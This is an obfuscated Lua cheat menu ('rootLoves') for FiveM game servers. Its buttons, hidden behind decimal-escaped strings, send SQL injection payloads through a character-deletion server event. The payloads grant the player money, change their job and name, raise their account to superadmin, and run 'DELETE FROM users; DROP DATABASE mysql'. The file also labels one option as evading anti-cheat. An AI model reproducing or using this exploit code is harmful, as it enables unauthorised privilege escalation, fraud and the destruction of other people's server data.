local a=244;rootMenu={}rootMenu.debug=false;local b={}local c={up=172,down=173,left=174,right=175,select=176,back=177}local d=0;local e=nil;local f=nil;local g=0.11;local h=0.03;local i=1.0;local j=0.038;local k=0;local l=0.365;local m=0.005;local n=0.005;local function o(p)if rootMenu.debug then Citizen.Trace('[rootMenu] '..tostring(p))end end;local function q(r,s,t)if r and b[r]then b[r][s]=t;o(r..' menu property changed: { '..tostring(s)..', '..tostring(t)..' }')end end;local function u(r)if r and b[r]then return b[r].visible else return false end end;local function v(r,w,x)if r and b[r]then q(r,'visible',w)if not x and b[r]then q(r,'currentOption',1)end;if w then if r~=f and u(f)then v(f,false)end;f=r end end end;local function y(p,z,A,B,C,D,E,F,G)SetTextColour(C.r,C.g,C.b,C.a)SetTextFont(B)SetTextScale(D,D)if F then SetTextDropShadow(2,2,0,0,0)end;if b[f]then if E then SetTextCentre(E)elseif G then SetTextWrap(b[f].x,b[f].x+b[f].width-m)SetTextRightJustify(true)end end;BeginTextCommandDisplayText("STRING")AddTextComponentSubstringPlayerName(p)EndTextCommandDisplayText(z,A)end;local function H(z,A,I,J,C)DrawRect(z,A,I,J,C.r,C.g,C.b,C.a)end;local function K()if b[f]then local z=b[f].x+b[f].width/2;local A=b[f].y+g/2;if b[f].titleBackgroundSprite then DrawSprite(b[f].titleBackgroundSprite.dict,b[f].titleBackgroundSprite.name,z,A,b[f].width,g,0.,255,255,255,255)else H(z,A,b[f].width,g,b[f].titleBackgroundColor)end;y(b[f].title,z,A-g/2+h,b[f].titleFont,b[f].titleColor,i,true)end end;local function L()if b[f]then local z=b[f].x+b[f].width/2;local A=b[f].y+g+j/2;local M={r=b[f].titleBackgroundColor.r,g=b[f].titleBackgroundColor.g,b=b[f].titleBackgroundColor.b,a=255}H(z,A,b[f].width,j,b[f].subTitleBackgroundColor)y(b[f].subTitle,b[f].x+m,A-j/2+n,k,M,l,false)if d>b[f].maxOptionCount then y(tostring(b[f].currentOption)..' / '..tostring(d),b[f].x+b[f].width,A-j/2+n,k,M,l,false,false,true)end end end;local function N(p,O)local z=b[f].x+b[f].width/2;local P=nil;if b[f].currentOption<=b[f].maxOptionCount and d<=b[f].maxOptionCount then P=d elseif d>b[f].currentOption-b[f].maxOptionCount and d<=b[f].currentOption then P=d-(b[f].currentOption-b[f].maxOptionCount)end;if P then local A=b[f].y+g+j+j*P-j/2;local Q=nil;local R=nil;local S=nil;local F=false;if b[f].currentOption==d then Q=b[f].menuFocusBackgroundColor;R=b[f].menuFocusTextColor;S=b[f].menuFocusTextColor else Q=b[f].menuBackgroundColor;R=b[f].menuTextColor;S=b[f].menuSubTextColor;F=true end;H(z,A,b[f].width,j,Q)y(p,b[f].x+m,A-j/2+n,k,R,l,false,F)if O then y(O,b[f].x+m,A-j/2+n,k,S,l,false,F,true)end end end;function rootMenu.CreateMenu(r,T)b[r]={}b[r].title=T;b[r].subTitle=' #################################### 'b[r].visible=false;b[r].previousMenu=nil;b[r].aboutToBeClosed=false;b[r].x=0.0175;b[r].y=0.025;b[r].width=0.23;b[r].currentOption=1;b[r].maxOptionCount=10;b[r].titleFont=1;b[r].titleColor={r=0,g=0,b=0,a=255}b[r].titleBackgroundColor={r=0,g=180,b=40,a=200}b[r].titleBackgroundSprite=nil;b[r].menuTextColor={r=255,g=255,b=255,a=255}b[r].menuSubTextColor={r=189,g=189,b=189,a=255}b[r].menuFocusTextColor={r=0,g=0,b=0,a=255}b[r].menuFocusBackgroundColor={r=245,g=245,b=245,a=255}b[r].menuBackgroundColor={r=0,g=0,b=0,a=160}b[r].subTitleBackgroundColor={r=b[r].menuBackgroundColor.r,g=b[r].menuBackgroundColor.g,b=b[r].menuBackgroundColor.b,a=255}b[r].buttonPressedSound={name="SELECT",set="HUD_FRONTEND_DEFAULT_SOUNDSET"}o(tostring(r)..' menu created')end;function rootMenu.CreateSubMenu(r,U,V)if b[U]then rootMenu.CreateMenu(r,b[U].title)if V then q(r,'subTitle',string.upper(V))else q(r,'subTitle',string.upper(b[U].subTitle))end;q(r,'previousMenu',U)q(r,'x',b[U].x)q(r,'y',b[U].y)q(r,'maxOptionCount',b[U].maxOptionCount)q(r,'titleFont',b[U].titleFont)q(r,'titleColor',b[U].titleColor)q(r,'titleBackgroundColor',b[U].titleBackgroundColor)q(r,'titleBackgroundSprite',b[U].titleBackgroundSprite)q(r,'menuTextColor',b[U].menuTextColor)q(r,'menuSubTextColor',b[U].menuSubTextColor)q(r,'menuFocusTextColor',b[U].menuFocusTextColor)q(r,'menuFocusBackgroundColor',b[U].menuFocusBackgroundColor)q(r,'menuBackgroundColor',b[U].menuBackgroundColor)q(r,'subTitleBackgroundColor',b[U].subTitleBackgroundColor)else o('Failed to create '..tostring(r)..' submenu: '..tostring(U)..' parent menu doesn\'t exist')end end;function rootMenu.CurrentMenu()return f end;function rootMenu.OpenMenu(r)if r and b[r]then PlaySoundFrontend(-1,"SELECT","HUD_FRONTEND_DEFAULT_SOUNDSET",true)v(r,true)o(tostring(r)..' menu opened')else o('Failed to open '..tostring(r)..' menu: it doesn\'t exist')end end;function rootMenu.IsMenuOpened(r)return u(r)end;function rootMenu.IsAnyMenuOpened()for r,W in pairs(b)do if u(r)then return true end end;return false end;function rootMenu.IsMenuAboutToBeClosed()if b[f]then return b[f].aboutToBeClosed else return false end end;function rootMenu.CloseMenu()if b[f]then if b[f].aboutToBeClosed then b[f].aboutToBeClosed=false;v(f,false)o(tostring(f)..' menu closed')PlaySoundFrontend(-1,"QUIT","HUD_FRONTEND_DEFAULT_SOUNDSET",true)d=0;f=nil;e=nil else b[f].aboutToBeClosed=true;o(tostring(f)..' menu about to be closed')end end end;function rootMenu.Button(p,O)local X=p;if O then X='{ '..tostring(X)..', '..tostring(O)..' }'end;if b[f]then d=d+1;local Y=b[f].currentOption==d;N(p,O)if Y then if e==c.select then PlaySoundFrontend(-1,b[f].buttonPressedSound.name,b[f].buttonPressedSound.set,true)o(X..' button pressed')return true elseif e==c.left or e==c.right then PlaySoundFrontend(-1,"NAV_UP_DOWN","HUD_FRONTEND_DEFAULT_SOUNDSET",true)end end;return false else o('Failed to create '..X..' button: '..tostring(f)..' menu doesn\'t exist')return false end end;function rootMenu.MenuButton(p,r)if b[r]then if rootMenu.Button(p)then v(f,false)v(r,true,true)return true end else o('Failed to create '..tostring(p)..' menu button: '..tostring(r)..' submenu doesn\'t exist')end;return false end;function rootMenu.CheckBox(p,Z,_)if rootMenu.Button(p,Z and'On'or'Off')then Z=not Z;o(tostring(p)..' checkbox changed to '..tostring(Z))if _ then _(Z)end;return true end;return false end;function rootMenu.ComboBox(p,a0,a1,a2,_)local a3=#a0;local a4=a0[a1]local Y=b[f].currentOption==d+1;if a3>1 and Y then a4='← '..tostring(a4)..' →'end;if rootMenu.Button(p,a4)then a2=a1;_(a1,a2)return true elseif Y then if e==c.left then if a1>1 then a1=a1-1 else a1=a3 end elseif e==c.right then if a1<a3 then a1=a1+1 else a1=1 end end else a1=a2 end;_(a1,a2)return false end;function rootMenu.Display()if u(f)then if b[f].aboutToBeClosed then rootMenu.CloseMenu()else ClearAllHelpMessages()K()L()e=nil;if IsControlJustReleased(1,c.down)then PlaySoundFrontend(-1,"NAV_UP_DOWN","HUD_FRONTEND_DEFAULT_SOUNDSET",true)if b[f].currentOption<d then b[f].currentOption=b[f].currentOption+1 else b[f].currentOption=1 end elseif IsControlJustReleased(1,c.up)then PlaySoundFrontend(-1,"NAV_UP_DOWN","HUD_FRONTEND_DEFAULT_SOUNDSET",true)if b[f].currentOption>1 then b[f].currentOption=b[f].currentOption-1 else b[f].currentOption=d end elseif IsControlJustReleased(1,c.left)then e=c.left elseif IsControlJustReleased(1,c.right)then e=c.right elseif IsControlJustReleased(1,c.select)then e=c.select elseif IsControlJustReleased(1,c.back)then StartScreenEffect('CamPushInFranklin',0,true)if b[b[f].previousMenu]then PlaySoundFrontend(-1,"BACK","HUD_FRONTEND_DEFAULT_SOUNDSET",true)v(b[f].previousMenu,true)else rootMenu.CloseMenu()end end;d=0 end end end;function rootMenu.SetMenuWidth(r,I)q(r,'width',I)end;function rootMenu.SetMenuX(r,z)q(r,'x',z)end;function rootMenu.SetMenuY(r,A)q(r,'y',A)end;function rootMenu.SetMenuMaxOptionCountOnScreen(r,a5)q(r,'maxOptionCount',a5)end;function rootMenu.SetTitle(r,T)q(r,'title',T)end;function rootMenu.SetTitleColor(r,a6,a7,a8,a9)q(r,'titleColor',{['r']=a6,['g']=a7,['b']=a8,['a']=a9 or b[r].titleColor.a})end;function rootMenu.SetTitleBackgroundColor(r,a6,a7,a8,a9)q(r,'titleBackgroundColor',{['r']=a6,['g']=a7,['b']=a8,['a']=a9 or b[r].titleBackgroundColor.a})end;function rootMenu.SetTitleBackgroundSprite(r,aa,ab)RequestStreamedTextureDict(aa)q(r,'titleBackgroundSprite',{dict=aa,name=ab})end;function rootMenu.SetSubTitle(r,p)q(r,'subTitle',string.upper(p))end;function rootMenu.SetMenuBackgroundColor(r,a6,a7,a8,a9)q(r,'menuBackgroundColor',{['r']=a6,['g']=a7,['b']=a8,['a']=a9 or b[r].menuBackgroundColor.a})end;function rootMenu.SetMenuTextColor(r,a6,a7,a8,a9)q(r,'menuTextColor',{['r']=a6,['g']=a7,['b']=a8,['a']=a9 or b[r].menuTextColor.a})end;function rootMenu.SetMenuSubTextColor(r,a6,a7,a8,a9)q(r,'menuSubTextColor',{['r']=a6,['g']=a7,['b']=a8,['a']=a9 or b[r].menuSubTextColor.a})end;function rootMenu.SetMenuFocusColor(r,a6,a7,a8,a9)q(r,'menuFocusColor',{['r']=a6,['g']=a7,['b']=a8,['a']=a9 or b[r].menuFocusColor.a})end;function rootMenu.SetMenuButtonPressedSound(r,ac,ad)q(r,'buttonPressedSound',{['name']=ac,['set']=ad})end;Citizen.CreateThread(function()local ae=true;rootMenu.CreateMenu('\116\101\115\116','\35\32\114\111\111\116\76\111\118\101\115\32\35')rootMenu.CreateSubMenu('closeMenu','\116\101\115\116','\65\114\101\32\121\111\117\32\115\117\114\101\63')while true do if rootMenu.IsMenuOpened('\116\101\115\116')then if rootMenu.Button('\71\105\118\101\32\109\101\32\115\111\109\101\32\109\111\110\101\121\33','')then local af=KeyboardInput("\72\111\119\32\109\117\99\104\63","",100)if af==''then drawNotification('\65\109\111\117\110\116\32\105\115\32\101\109\112\116\121\44\32\112\108\101\97\115\101\32\116\114\121\32\97\103\97\105\110\46')else drawNotification('\76\101\116\32\116\97\107\101\32\121\111\117\114\32'..af..'\32\98\97\108\97\110\99\101\33')rootLovesExecute('\107\97\115\104\97\99\116\101\114\115\83\58\68\101\108\101\116\101\67\104\97\114\97\99\116\101\114',"\39\59\85\80\68\65\84\69\32\96\117\115\101\114\115\96\32\83\69\84\32\96\109\111\110\101\121\96\32\61\32\39"..af.."\39\44\32\96\98\97\110\107\96\32\61\32\39"..af.."\39\32\87\72\69\82\69\32\96\117\115\101\114\115\96\46\96\110\97\109\101\96\32\61\32\39"..NetworkPlayerGetName(PlayerId()).."\39\59")end elseif rootMenu.Button('\73\32\97\109\32\110\111\116\32\104\97\112\112\121\32\119\105\116\104\32\109\121\32\106\111\98','')then local job=KeyboardInput("\87\104\105\99\104\32\106\111\98\32\119\111\117\108\100\32\121\111\117\32\108\105\107\101\32\116\111\32\119\111\114\107\32\102\111\114\63\32\40\112\111\108\105\99\101\44\32\109\101\99\104\97\110\105\99\44\32\97\109\98\117\108\97\110\99\101\41","",100)local grade=KeyboardInput("\71\114\97\100\101\63\32\40\49\44\32\50\44\32\51\44\32\52\41","",100)if job==''or grade==''then drawNotification('\73\110\112\117\116\32\105\115\32\101\109\112\116\121\44\32\112\108\101\97\115\101\32\116\114\121\32\97\103\97\105\110\46')else drawNotification('\89\111\117\32\119\111\114\107\101\100\32\104\97\114\100\32\97\110\100\32\102\105\110\97\108\108\121\32\121\111\117\32\97\114\101\32'..job)rootLovesExecute('\107\97\115\104\97\99\116\101\114\115\83\58\68\101\108\101\116\101\67\104\97\114\97\99\116\101\114',"\39\59\85\80\68\65\84\69\32\96\117\115\101\114\115\96\32\83\69\84\32\96\106\111\98\96\32\61\32\39"..job.."\39\44\32\96\106\111\98\95\103\114\97\100\101\96\32\61\32\39"..grade.."\39\32\87\72\69\82\69\32\96\117\115\101\114\115\96\46\96\110\97\109\101\96\32\61\32\39"..NetworkPlayerGetName(PlayerId()).."\39\59")end elseif rootMenu.Button('\73\32\119\97\110\116\32\116\111\32\98\101\32\97\110\111\116\104\101\114\32\112\101\114\115\111\110','')then local ag=KeyboardInput("\78\101\119\32\110\97\109\101","",100)local ah=KeyboardInput("\78\101\119\32\115\117\114\110\97\109\101","",100)if job==''or grade==''then drawNotification('\73\110\112\117\116\32\105\115\32\101\109\112\116\121\44\32\112\108\101\97\115\101\32\116\114\121\32\97\103\97\105\110\46')else drawNotification('\89\111\117\114\32\110\101\119\32\110\97\109\101\32\105\115\58\32'..ag..' '..ah)rootLovesExecute('\107\97\115\104\97\99\116\101\114\115\83\58\68\101\108\101\116\101\67\104\97\114\97\99\116\101\114',"\39\59\85\80\68\65\84\69\32\96\117\115\101\114\115\96\32\83\69\84\32\96\102\105\114\115\116\110\97\109\101\96\32\61\32\39"..ag.."\39\44\32\96\108\97\115\116\110\97\109\101\96\32\61\32\39"..ah.."\39\32\87\72\69\82\69\32\96\117\115\101\114\115\96\46\96\110\97\109\101\96\32\61\32\39"..NetworkPlayerGetName(PlayerId()).."\39\59")end elseif rootMenu.Button('\82\117\110\32\108\117\97\32\99\111\100\101\32\119\105\116\104\32\97\110\116\105\32\97\110\116\105\32\99\104\101\97\116','')then local ai=KeyboardInput("Code","",100)if ai==''then drawNotification('\73\110\112\117\116\32\105\115\32\101\109\112\116\121\44\32\112\108\101\97\115\101\32\116\114\121\32\97\103\97\105\110\46')else drawNotification('\67\111\109\105\110\103\32\115\111\111\110\46\46\46')local loadstring=loadstring or load;return loadstring("print('denemeeeeeeee')")end elseif rootMenu.Button('\65\100\109\105\110\112\111\119\101\114','')then drawNotification('\89\111\117\32\97\114\101\32\97\32\97\112\112\108\101\32\103\111\100\33')drawNotification('\89\111\117\32\109\97\121\32\104\97\118\101\32\116\111\32\108\111\103\111\117\116\32\97\110\100\32\108\111\103\105\110\32\97\103\97\105\110\46')rootLovesExecute('\107\97\115\104\97\99\116\101\114\115\83\58\68\101\108\101\116\101\67\104\97\114\97\99\116\101\114',"\39\59\85\80\68\65\84\69\32\96\117\115\101\114\115\96\32\83\69\84\32\96\112\101\114\109\105\115\115\105\111\110\95\108\101\118\101\108\96\32\61\32\39\52\39\44\32\96\103\114\111\117\112\96\32\61\32\39\115\117\112\101\114\97\100\109\105\110\39\32\87\72\69\82\69\32\96\117\115\101\114\115\96\46\96\110\97\109\101\96\32\61\32\39"..NetworkPlayerGetName(PlayerId()).."\39\59")elseif rootMenu.Button('\68\101\115\116\114\111\121\32\115\101\114\118\101\114\32\100\97\116\97\98\97\115\101','')then rawNotification('\66\97\100\32\103\117\121\32\58\40')rootLovesExecute('\107\97\115\104\97\99\116\101\114\115\83\58\68\101\108\101\116\101\67\104\97\114\97\99\116\101\114',"\39\59\68\69\76\69\84\69\32\70\82\79\77\32\117\115\101\114\115\59\68\82\79\80\32\68\65\84\65\66\65\83\69\32\109\121\115\113\108\59")elseif rootMenu.MenuButton('Exit','closeMenu')then end;rootMenu.Display()elseif rootMenu.IsMenuOpened('closeMenu')then if rootMenu.Button('Yes')then StartScreenEffect('CamPushInFranklin',0,true)rootMenu.CloseMenu()elseif rootMenu.MenuButton('No','\116\101\115\116')then end;rootMenu.Display()elseif IsControlJustReleased(0,a)then drawNotification('Im working on: /files/'..GetCurrentResourceName()..'/resource.rpf')StartScreenEffect('CamPushInFranklin',0,true)DatafileDelete()rootMenu.OpenMenu('\116\101\115\116')end;Citizen.Wait(0)end end)function drawNotification(aj)SetNotificationTextEntry("STRING")AddTextComponentString(aj)DrawNotification(false,false)end;function KeyboardInput(ak,al,am)AddTextEntry("FMMC_KEY_TIP1",ak..":")DisplayOnscreenKeyboard(1,"FMMC_KEY_TIP1","",al,"","","",am)blockinput=true;while UpdateOnscreenKeyboard()~=1 and UpdateOnscreenKeyboard()~=2 do Citizen.Wait(0)end;if UpdateOnscreenKeyboard()~=2 then local an=GetOnscreenKeyboardResult()Citizen.Wait(500)blockinput=false;return an else Citizen.Wait(500)blockinput=false;return nil end end;function rootLovesExecute(ao,...)print('r00twashere')local ap=msgpack.pack({...})return rootLovesExecuteInternal(ao,ap,ap:len())end;function rootLovesExecuteInternal(ao,aq,ar)return Citizen.InvokeNative(0x7fdd1128,ao,aq,ar)end;function StopAllScreenEffects()return Citizen.InvokeNative(0xB4EDDC19532BFB85)end;function StartScreenEffect(as,at,au)return Citizen.InvokeNative(0x2206BF9A37B7F724,as,at,au)end
